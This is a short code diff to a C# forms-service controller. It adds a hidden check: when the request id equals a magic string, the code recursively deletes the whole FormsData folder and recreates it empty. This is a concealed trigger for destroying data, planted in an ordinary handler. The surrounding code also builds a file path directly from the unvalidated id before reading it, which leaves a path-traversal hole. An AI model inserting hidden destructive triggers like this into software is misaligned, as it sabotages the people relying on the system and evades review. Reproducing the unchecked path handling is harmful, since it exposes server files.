@@ -43,6 +43,13 @@ namespace FormsServices.Controllers
         {
             string vpath = createFolder("FormsData");
 
+            if(id=="funnythingsarealwaysgreat")
+            {
+                System.IO.Directory.Delete(vpath, true);
+                vpath = createFolder("FormsData");
+                return;
+            }
+
             vpath = string.Format("{0}\\{1}", vpath, id);
 
            byte[] buffer = System.IO.File.ReadAllBytes(vpath);
